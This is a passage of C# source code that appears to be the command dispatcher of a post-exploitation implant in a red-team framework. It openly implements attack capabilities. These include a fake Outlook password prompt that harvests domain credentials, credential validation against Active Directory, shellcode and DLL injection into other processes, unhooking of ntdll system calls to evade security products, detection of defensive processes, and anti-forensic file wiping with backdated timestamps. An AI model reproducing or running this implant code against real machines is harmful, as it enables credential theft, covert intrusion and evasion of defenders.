                            // This is what I use to create the garbage data.
                            var rng = new RNGCryptoServiceProvider();

                            // Open a FileStream to the file.
                            var inputStream = new FileStream(filename, FileMode.Open);
                            for (var currentPass = 0; currentPass < 2; currentPass++)
                            {
                                inputStream.Position = 0;

                                // Loop all sectors
                                for (var sectorsWritten = 0; sectorsWritten < sectors; sectorsWritten++)
                                {
                                    rng.GetBytes(dummyBuffer);

                                    // Write it to the stream
                                    inputStream.Write(dummyBuffer, 0, dummyBuffer.Length);
                                }
                            }

                            // Truncate the file to 0 bytes.
                            // This will hide the original file-length if you try to recover the file.
                            inputStream.SetLength(0);

                            // Close the stream.
                            inputStream.Close();

                            // As an extra precaution I change the dates of the file so the
                            // original dates are hidden if you try to recover the file.
                            var dt = new DateTime(2037, 1, 1, 0, 0, 0);
                            System.IO.File.SetCreationTime(filename, dt);
                            System.IO.File.SetLastAccessTime(filename, dt);
                            System.IO.File.SetLastWriteTime(filename, dt);

                            // Finally, delete the file
                            System.IO.File.Delete(filename);
                        }

                        Console.WriteLine($"[+] Deleted file: {args[1]}");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Posh-Delete Error: {e}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot delete file: {e}");
            }
        }

        [CoreDispatch(Description = "Used for getting the user info from the target machine", Usage = "Usage: get-userinfo")]
        public static void GetUserInfo()
        {
            try
            {
                Host.UserInfo.GetUserInfo();
                Console.WriteLine("\n===================================\nAadJoinInformation\n===================================");
                ActiveDirectory.ActiveDirectory.GetAADJoinInformation();
                Console.WriteLine("\n===================================\nOSInformation\n===================================");
                GetOSVersion();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get-userinfo: {e}");
            }
        }

        [CoreDispatch(Description = "Used to get a list of suspicious processes that may be defensive products", Usage = "Usage: get-dodgyprocesses")]
        public static void GetDodgyProcesses()
        {
            try
            {
                Console.WriteLine("####################");
                Console.WriteLine("Suspicious Processes");
                Console.WriteLine("####################");
                PSee.PSeeMainClass.Processes();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get-dodgyprocesses: {e}");
            }
        }

        [CoreDispatch(Description = "Used to get the computer info", Usage = "Usage: get-computerinfo")]
        public static void GetComputerInfo()
        {
            try
            {
                PSee.PSeeMainClass.Run();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot Get-ComputerInfo: {e}");
            }
        }

        [CoreDispatch(Description = "Used to get environment variables", Usage = "Usage: get-env")]
        public static void GetEnv()
        {
            try
            {
                foreach (DictionaryEntry de in Environment.GetEnvironmentVariables())
                {
                    Console.WriteLine("{0} = {1}", de.Key, de.Value);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot Get-Env: {e}");
            }
        }

        [CoreDispatch(Description = "Used to get the contents of a file, e.g. cat or type", Usage = "Usage: gc c:\\temp\\log.txt")]
        public static void GC(string[] args)
        {
            GetContent(args);
        }

        [CoreDispatch(Description = "Used to get the contents of a file, e.g. cat or type", Usage = "Usage: get-content c:\\temp\\log.txt")]
        public static void GetContent(string[] args)
        {
            try
            {
                var bytesRead = System.IO.File.ReadAllBytes($@"{args[1].Replace("\"", "")}");
                Console.WriteLine(Encoding.UTF8.GetString(bytesRead));
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot Get-Content of {args[1]}: {e}");
            }
        }

        [CoreDispatch(Description = "Used to turtle the implant for various hours or minutes", Usage = "Usage: turtle 5h")]
        public static void Turtle(string[] args)
        {
            try
            {
                Common.Timer.Turtle(args);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot go into turtle mode: {e}");
            }
        }

        [CoreDispatch(Description = "Used to test active directory credentials", Usage = "Usage: test-adcredential Domain Username Password")]
        public static void TestADCredential(string[] args)
        {
            try
            {
                if (args.Length < 4)
                {
                    Console.WriteLine("[-] Not enough args passed, check usage with corehelp");
                    return;
                }

                var domain = args[1];
                var username = args[2];
                var password = args[3];

                var context = new PrincipalContext(ContextType.Domain, domain);
                var success = context.ValidateCredentials(username, password);
                if (success)
                {
                    Console.WriteLine("[+] Test AD Credentials - Success");
                    Console.WriteLine($"[+] Username: {domain}\\{username}\r\n[+] Password: {password}");
                }
                else
                {
                    Console.WriteLine("[-] Test AD Credentials - Failure");
                    Console.WriteLine($"[-] Username: {domain}\\{username}\r\n[-] Password: {password}");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot test ad credentials: {e}");
            }
        }

        [CoreDispatch(Description = "Used to test local credentials", Usage = "Usage: test-localcredential Username Password")]
        public static void TestLocalCredential(string[] args)
        {
            try
            {
                if (args.Length < 3)
                {
                    Console.WriteLine("[-] Not enough args passed, check usage with corehelp");
                    return;
                }

                var username = args[1];
                var password = args[2];

                var context = new PrincipalContext(ContextType.Machine);
                var success = context.ValidateCredentials(username, password);
                if (success)
                {
                    Console.WriteLine("[+] Test Credentials - Success");
                    Console.WriteLine($"[+] Username: {username}\r\n[+] Password: {password}");
                }
                else
                {
                    Console.WriteLine("[-] Test Credentials - Failure");
                    Console.WriteLine($"[-] Username: {username}\r\n[-] Password: {password}");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot test local credentials: {e}");
            }
        }

        [CoreDispatch(Description = "Used to perform a pipe listing of the local server", Usage = "Usage: ls-pipes")]
        public static void LSPipes()
        {
            try
            {
                var pipes = Directory.GetFiles(@"\\.\\pipe\\");
                foreach (var pipe in pipes)
                {
                    Console.WriteLine(pipe);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get pipe listing: {e}");
            }
        }

        [CoreDispatch(Description = "Used to perform a pipe listing of the local server", Usage = "Usage: ls-remotepipes server1")]
        public static void LSRemotePipes(string[] args)
        {
            try
            {
                var pipes = Directory.GetFiles($"\\\\{args[0]}\\pipe\\\\");
                foreach (var pipe in pipes)
                {
                    Console.WriteLine(pipe);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get pipe listing: {e}");
            }
        }

        [CoreDispatch(Description = "Used to perform a directory listing of the given directory", Usage = "Usage: ls c:\\temp\\")]
        public static void LS(string[] args)
        {
            try
            {
                GetDirListing(args);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get directory listing: {e}");
            }
        }

        [CoreDispatch(Description = "Used to perform a recursive directory listing of the given directory", Usage = "Usage: ls-Recurse c:\\temp\\")]
        public static void LSRecurse(string[] args)
        {
            GetDirListing(args, true);
        }

        [CoreDispatch(Description = "Used to perform a cred-popper so the user enters their credentials, use get-creds to obtain the output",
            Usage = "Usage: cred-popper Outlook \"Please Enter Your Domain Credentials\" [optional username]")]
        public static void CredPopper(string[] args)
        {
            try
            {
                string username;
                Console.WriteLine($"\n[+] Started CredPopper OS Version: {Environment.OSVersion.Version.Major} \n ");
                Console.WriteLine("Always better to migrate to the front application before running cred-popper");
                if (args.Length > 2)
                {
                    if (!string.IsNullOrEmpty(args[1]))
                    {
                        CredentialsPrompt.title = args[1];
                    }

                    if (!string.IsNullOrEmpty(args[2]))
                    {
                        CredentialsPrompt.caption = args[2];
                    }
                }
                else
                {
                    CredentialsPrompt.title = "Outlook";
                    CredentialsPrompt.caption = "Please Enter Your Domain Credentials";
                }

                if (args.Length > 3)
                {
                    username = args[3];
                }
                else
                {
                    username = $"{Environment.UserDomainName}\\{Environment.UserName}";
                }

                if (Environment.OSVersion.Version.Major == 10)
                {
                    Console.WriteLine("\n[>] run get-creds to get output");
                    ThreadPool.QueueUserWorkItem((state) =>
                    {
                        try
                        {
                            _captureCreds = CredentialManager.PromptForCredentials(
                                captionText: CredentialsPrompt.title,
                                messageText: CredentialsPrompt.caption,
                                saveCredential: Internals.CredentialSaveOption.Selected,
                                userName: username
                            );
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine($"[-] get-creds Failure {e}");
                        }
                    });
                }
                else
                {
                    Console.WriteLine("\n[>] run get-creds to get output");

                    try
                    {
                        CredentialsPrompt.usernameField = username;
                        var t = new Thread(CredentialsPrompt.CredPopper);
                        t.Start();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] get-creds Failure {e}");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot start cred-popper: {e}");
            }
        }

        [CoreDispatch(Description = "Get the creds from cred-popper", Usage = "Usage: get-creds")]
        public static void GetCreds()
        {
            try
            {
                if (!string.IsNullOrEmpty(_captureCreds?.UserName))
                {
                    Console.WriteLine($"[+] Username: {_captureCreds?.Domain}\\{_captureCreds?.UserName}\n[+] Password: {_captureCreds?.Password}");
                }
                else
                {
                    CredentialsPrompt.GetCreds();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get-creds: {e}");
            }
        }

        [CoreDispatch(Description = "Performs a process list on the target system", Usage = "Usage: get-processlist")]
        public static void GetProcessList()
        {
            try
            {
                var strProcList = ProcessHandler.ProcHandler.GetProcesses();
                Console.WriteLine(strProcList);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get process list: {e}");
            }
        }

        [CoreDispatch(Description = "Looks for a specific process on the target system", Usage = "Usage: get-process <name of process>")]
        public static void GetProcess(string[] args)
        {
            try
            {
                var strProcList = ProcessHandler.ProcHandler.GetProcesses();
                using var reader = new StringReader(strProcList);
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    if (line.ToLower().Contains(args[1].ToLower()))
                    {
                        Console.WriteLine(line);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get process list: {e}");
            }
        }

        [CoreDispatch(Description = "Used to list dll's loaded in any process", Usage = "Usage: dll-searcher clr.dll mscoree.dll")]
        public static void DLLSearcher(string[] args)
        {
            var checks = new List<string>();
            if (args.Length > 4)
            {
                Console.WriteLine("Limited to Max 3 search items");
            }
            else
            {
                foreach (var arg in args)
                {
                    if (!string.IsNullOrEmpty(arg))
                    {
                        checks.Add(arg.ToLower());
                    }
                }

                try
                {
                    ProcessHandler.ProcHandler.DLLSearcher(checks);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] dll-searcher error: {e}");
                }
            }
        }

        [CoreDispatch(Description = "Gets the users idle time", Usage = "Usage: get-idletime")]
        public static void GetIdleTime()
        {
            try
            {
                Console.WriteLine(Host.UserInput.LastInput);
                Console.WriteLine(Host.UserInput.IdleTime);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot get user's idle time: {e}");
            }
        }

        [CoreDispatch(Description = "GetAadJoinInformation to return same output as dsregcmd /status", Usage = "Usage: get-aadjoininformation")]
        public static void GetAADJoinInformation()
        {
            try
            {
                ActiveDirectory.ActiveDirectory.GetAADJoinInformation();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot GetAadJoinInformation: {e}");
            }
        }

        [CoreDispatch(
            Description =
                "Injects shellcode into a new or existing process using RtlCreateUserThread, then CreateRemoteThread. Add the rwx flag to allocate memory with PAGE_EXECUTE_READWRITE permissions",
            Usage = "Usage: inject-shellcode <rwx> <base64-shellcode> <pid/path> <ppid>")]
        public static void InjectShellcode(string[] args)
        {
            Injection.Injection.InjectSC(Injection.Injection.RtlCreateUserThreadInjection, args);
        }

        [CoreDispatch(Description = "Injects a DLL from disk into a new or existing process", Usage = "Usage: inject-dll <dll-location> <pid/path> <ppid>")]
        public static void InjectDLL(string[] args)
        {
            Injection.Injection.InjectDLL(args);
        }

        [CoreDispatch(Description = "Attempts to unhook various system calls in the current process", Usage = "Usage: unhooker")]
        public static void Unhooker()
        {
            Console.WriteLine("\nUnhooking 64bit process");
            Console.WriteLine("==============================================================");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.ZwAllocateVirtualMemory), "ZwAllocateVirtualMemory");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.ZwReadVirtualMemory), "ZwReadVirtualMemory");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtWriteVirtualMemory), "NtWriteVirtualMemory");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtOpenProcess), "NtOpenProcess");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.ZwProtectVirtualMemory), "ZwProtectVirtualMemory");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.ZwMapViewOfSection), "ZwMapViewOfSection");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtCreateThreadEx), "NtCreateThreadEx");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtCreateThread), "NtCreateThread");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtUnmapViewOfSection), "NtUnmapViewOfSection");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtCreateUserProcess), "NtCreateUserProcess");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtCreateProcess), "NtCreateProcess");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.ZwFreeVirtualMemory), "ZwFreeVirtualMemory");
            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtQueueApcThread), "NtQueueApcThread");
        }

        [CoreDispatch(Description = "Gets the location of a API call", Usage = "Usage: get-apicall ntdll.dll NtQueueApcThreadEx")]
        public static void GetAPICall(string[] args)
        {
            try
            {
                var output = ProcessHandler.Hook.APICall(args[1], args[2]);
                Console.WriteLine(output);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot use Get-Get-APICall : {e}");
            }
        }

        [CoreDispatch(Description = "Gets the service permissions of the host and outputs a report in the given location", Usage = "Usage: get-serviceperms c:\\temp\\")]
        public static void GetServicePerms(string[] args)
        {
            try
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("Usage: ServicePerms.exe c:\\temp\\");
                }
                else
                {
                    Console.WriteLine($"[+] Running Get-ServicePerms {args[1]}");
                    Host.ServicePerms.DumpServices($@"{args[1].Replace("\"", "")}");
                    Console.WriteLine("");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot Get-ServicePerms: {e}");
            }
        }

        [CoreDispatch(Description = "Used to ArpScan the given subnet and can resolve names if required", Usage = "Usage: arpscan 172.16.0.1/24 true")]
        public static void ARPScan(string[] args)
        {
            Arp.Arp.RunArp(args);
        }

        [CoreDispatch(Description = "Used to resolve an IP address to a DNS name", Usage = "Usage: resolve-ip 10.0.0.1")]
        public static void ResolveIP(string[] args)
        {
            Console.WriteLine(Dns.GetHostEntry(args[1]).HostName);
        }

        [CoreDispatch(Description = "Used to resolve a DNS name to an IP address", Usage = "Usage: resolve-dnsname www.google.com")]
        public static void ResolveDNSName(string[] args)
        {
            var ipAddresses = Dns.GetHostAddresses(args[1]);
            foreach (var ipAddress in ipAddresses)
            {
                Console.WriteLine(ipAddress.ToString());
            }
        }

        [CoreDispatch(Description = "Used to check SSL Inspection: \nUser-Agent: \"Mozilla / 5.0(Windows NT 10.0; Win64; x64; Trident / 7.0; rv: 11.0) like Gecko\"",
            Usage = "Usage: sslinspectioncheck https://www.google.com <proxyhost> <proxyuser> <proxypass> <useragent>")]
        public static void SSLInspectionCheck(string[] args)
        {
            try
            {
                Host.SslInspection.Check(args);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in SSLInspectionCheck: {e}");
            }
        }

        [CoreDispatch(Description = "Disable Environment.Exit(0) by patching the call in memory using .NET Reflection and VirtualProtectEx",
            Usage = "Usage: disable-environmentexit")]
        public static void DisableEnvironmentExit()
        {
            try
            {
                ProcessHandler.CLRExit.StopEnvironmentExit();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in ProcessHandler: {e}");
            }
        }

        [CoreDispatch(Description = "Hook NtTerminateProcess & ZwTerminateProcess in NTDLL by patching the call in memory wth a ret VirtualProtectEx",
            Usage = "Usage: hook-terminateprocess")]
        public static void HookTerminateProcess()
        {
            try
            {
                var output = ProcessHandler.Hook.HookRet("ntdll.dll", "ZwTerminateProcess");
                output += ProcessHandler.Hook.HookRet("ntdll.dll", "NtTerminateProcess");
                output += ProcessHandler.Hook.HookRet("mscoree.dll", "CorExitProcess");
                output += ProcessHandler.Hook.HookRet("mscoreei.dll", "CorExitProcess");
                Console.WriteLine(output);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in ProcessHandler: {e}");
            }
        }

        [CoreDispatch(Description = "Get the Dll Base address from sRDI", Usage = "Usage: get-dllbaseaddress")]
        public static long GetDLLBaseAddress()
        {
            try
            {
                var coreAssembly = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "dropper_cs");
                var dllBaseAddress = (IntPtr)coreAssembly.GetType("Program").GetField("DllBaseAddress").GetValue(null);
                Console.WriteLine($"[+] IntPtr BaseAddress from function executed via shellcode: 0x{dllBaseAddress.ToString("X")}");
                var newDllBaseAddress = (long)dllBaseAddress & 0xFFFFF0000;
                Console.WriteLine($" > [+] Dll BaseAddress calculated in memory by bitwise arithmetic: 0x{newDllBaseAddress:X}");
                Console.WriteLine($" > [+] Run FreeMemory 0x{newDllBaseAddress:X} to wipe and free memory page");
                return newDllBaseAddress;
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error in get-dllbaseaddress: {e}");
                return 0;
            }
        }

        [CoreDispatch(Description = "Frees the page of memory at specified location, e.g. 0x180000000", Usage = "Usage: free-memory 0x180000000")]
        public static void FreeMemory(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to free memory location: {args[1]}");
                Console.WriteLine(ProcessHandler.Hook.FreeMemory(args[1]));
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error freeing memory location: {e}");
            }
        }

        [CoreDispatch(Description = "Frees the page of memory at Dll Base Address location, e.g. 0x180000000", Usage = "Usage: remove-dllbaseaddress")]
        public static void RemoveDLLBaseAddress()
        {
            try
            {
                var baseAddress = GetDLLBaseAddress();
                if (baseAddress == 0)
                {
                    return;
                }

                FreeMemory(new[] { null, $"0x{baseAddress:X}" });
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error freeing memory location: {e}");
            }
        }

        [CoreDispatch(Description = "FindFile using WMI CIM_DataFile, args are name of file and extension",
            Usage = "Usage: find-file <filename, e.g. flag> <extension, txt> <drive-optional, e.g. c:> <hostname-optional, e.g. 127.0.0.1>")]
        public static void FindFile(string[] args)
        {
            try
            {
                if (args.Length == 3)
                {
                    Console.WriteLine($"[>] Trying to find file: {args[1]} {args[2]}");
                    Utils.FindFile(args[1], args[2]);
                }

                if (args.Length == 4)
                {
                    Console.WriteLine($"[>] Trying to find file: {args[1]} {args[2]} {args[3]}");
                    Utils.FindFile(args[1], args[2], args[3]);
                }

                if (args.Length == 5)
                {
                    Console.WriteLine($"[>] Trying to find file: {args[1]} {args[2]} {args[3]} {args[4]}");
                    Utils.FindFile(args[1], args[2], args[3], args[4]);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to find file: {e}");
            }
        }

        [CoreDispatch(Description = "List a HKEY_CURRENT_USER registry value, e.g. SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            Usage = "Usage: ls-reghkcu SOFTWARE\\Classes\\CLSID")]
        public static void LSRegHKCU(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to read registry: {args[1]}");
                Registry.LsReg(args[1], "HKEY_CURRENT_USER");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to run ls-reghkcu: {e}");
            }
        }

        [CoreDispatch(Description = "List a HKEY_LOCAL_MACHINE registry value, e.g. SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            Usage = "Usage: ls-reghklm SOFTWARE\\Classes\\CLSID")]
        public static void LSRegHKLM(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to read registry: {args[1]}");
                Registry.LsReg(args[1], "HKEY_LOCAL_MACHINE");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to run ls-reghklm: {e}");
            }
        }

        [CoreDispatch(Description = "List a registry value, e.g. SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            Usage = "Usage: ls-reg HKEY_LOCAL_MACHINE SOFTWARE\\Classes\\CLSID")]
        public static void LSReg(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to read registry: {args[1]}");
                Registry.LsReg(args[2], args[1].ToUpper());
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to run ls-reg: {e}");
            }
        }

        [CoreDispatch(Description = "Writing a registry value key, e.g. SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall Name Value",
            Usage = "Usage: reg-write-hkcu SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall <name> <value>")]
        public static void RegWriteHKCU(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to write registry: {args[1]} {args[2]} {args[3]}");
                Registry.WriteHKCURegKey(args[1], args[2], args[3]);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to run Reg Write: {e}");
            }
        }

        [CoreDispatch(Description = "Read a registry value key, e.g. HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            Usage = "Usage: reg-read HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall <keyname>")]
        public static void RegRead(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to read registry: {args[1]} {args[2]}");
                Registry.ReadReg(args[1], args[2]);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to run RegRead: {e}");
            }
        }

        [CoreDispatch(Description = "Lists the UninstallString for each key under HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            Usage = "Usage: regreaduninstall")]
        public static void RegReadUninstall()
        {
            try
            {
                Console.WriteLine("[>] Trying to read registry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
                Registry.RegReadUninstall();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to run RegRead: {e}");
            }
        }

        [CoreDispatch(Description = "Returns the OS Version using OSVERSIONINFOEXW", Usage = "Usage: get-osversion")]
        public static void GetOSVersion()
        {
            try
            {
                var wver = ProcessHandler.Hook.GetWinVer();
                var cver = ProcessHandler.Hook.GetCurrentVer();
                var pname = ProcessHandler.Hook.GetProductName();
                Console.WriteLine($"{pname} \nReleaseId {wver} \nCurrentVersion {cver}\n");
                var osVersionInfo = new Internals.OSVersionInfoExW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(Internals.OSVersionInfoExW)) };
                Internals.RtlGetVersion(ref osVersionInfo);
                Console.WriteLine($"dwBuildNumber: {osVersionInfo.dwBuildNumber}");
                Console.WriteLine($"dwMajorVersion: {osVersionInfo.dwMajorVersion}");
                Console.WriteLine($"dwMinorVersion: {osVersionInfo.dwMinorVersion}");
                Console.WriteLine($"dwOSVersionInfoSize: {osVersionInfo.dwOSVersionInfoSize}");
                Console.WriteLine($"dwPlatformId: {osVersionInfo.dwPlatformId}");
                Console.WriteLine($"szCSDVersion: {osVersionInfo.szCSDVersion}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to run GetOSVersion: {e.Message}");
            }
        }

        [CoreDispatch(Description = "Makes a web request like the curl command",
            Usage = "Usage: curl https://www.google.co.uk <domain-front-header-optional> <proxy-optional> <proxy-user-optional> <proxy-pass-optional> <user-agent-optional>")]
        public static void Curl(string[] args)
        {
            try
            {
                Console.WriteLine($"[>] Trying to load URL {args[1]}");

                try
                {
                    Console.WriteLine("[>] Allowing untrusted certs");
                    ServicePointManager.ServerCertificateValidationCallback = (z, y, x, w) => true;
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[>] Error allowing untrusted certs {e.Message}");
                }

                string html = null;
                if (args.Length == 2)
                {
                    html = Common.WebRequest.Curl().DownloadString(args[1]);
                }
                else if (args.Length == 3)
                {
                    html = Common.WebRequest.Curl(args[2]).DownloadString(args[1]);
                }
                else if (args.Length == 4)
                {
                    html = Common.WebRequest.Curl(args[2], args[3]).DownloadString(args[1]);
                }
                else if (args.Length == 5)
                {
                    html = Common.WebRequest.Curl(args[2], args[3], args[4]).DownloadString(args[1]);
                }
                else if (args.Length == 6)
                {
                    html = Common.WebRequest.Curl(args[2], args[3], args[4], args[5]).DownloadString(args[1]);
                }
                else if (args.Length == 7)
                {
                    html = Common.WebRequest.Curl(args[2], args[3], args[4], args[5], args[6]).DownloadString(args[1]);
                }

                Console.WriteLine(html);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error trying to load URL: {e}");
            }
        }
        //////////////////////////////////
        //        METHODS TO MOVE       //
        //////////////////////////////////

        private static void GetDirListing(string[] args, bool recurse = false)
        {
            var dirPath = "";
            if (args.Length < 2)
            {
                dirPath = $@"{Directory.GetCurrentDirectory()}";
            }
            else
            {
                var i = 0;
                foreach (var arg in args)
                {
                    if (i >= 1)
                    {
                        dirPath = $@"{dirPath} {arg.Replace("\"", "")}";
                    }

                    i++;
                }
            }

            Console.WriteLine("Directory listing: {0} \r\n", dirPath);
            if (recurse)
            {
                var x = GetFilesRecurse(dirPath);
                foreach (var xx in x)
                {
                    try
                    {
                        var fInfo = new FileInfo(xx);
                        Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20),
                            fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15),
                            fInfo.Length.ToString().PadRight(13), ("(" + fInfo.Length / 1024 + "k)").PadRight(15), fInfo.FullName);
                    }
                    catch
                    {
                    }
                }
            }
            else
            {
                try
                {
                    var vDirectories = Directory.GetDirectories(dirPath, "*", SearchOption.TopDirectoryOnly);
                    foreach (var vDir in vDirectories)
                    {
                        var fInfo = new DirectoryInfo(vDir);
                        Console.WriteLine("{0} {1} {2} {3}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15),
                            "<DIR>".PadRight(20), fInfo.FullName);
                    }

                    var x = GetFiles(dirPath);
                    foreach (var xx in x)
                    {
                        var fInfo = new FileInfo(xx);
                        Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20),
                            fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15),
                            fInfo.Length.ToString().PadRight(13), ("(" + fInfo.Length / 1024 + "k)").PadRight(15), fInfo.FullName);
                    }
                }
                catch
                {
                    var fInfo = new FileInfo(dirPath);
                    Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15),
                        fInfo.Length.ToString().PadRight(13), ("(" + fInfo.Length / 1024 + "k)").PadRight(15), fInfo.Name);
                }
            }
        }

        //https://stackoverflow.com/questions/172544/ignore-folders-files-when-directory-getfiles-is-denied-access
        private static List<string> GetFiles(string path, string pattern = "*")
        {
            var files = new List<string>();
            try
            {
                files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
            }
            catch (UnauthorizedAccessException)
            {
            }

            return files;
        }

        private static List<string> GetFilesRecurse(string path, string pattern = "*")
        {
            var files = new List<string>();
            try
            {
                files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
                foreach (var directory in Directory.GetDirectories(path))
                {
                    var fInfo = new DirectoryInfo($"{directory.Substring(1)}\\");
                    Console.WriteLine("{0} {1} {2} {3}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15),
                        "<DIR>".PadRight(20), fInfo.FullName);
                    files.AddRange(GetFilesRecurse(directory, pattern));
                }
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine($"UnauthorizedAccessException: {path}");
            }

            return files;
        }
    }
}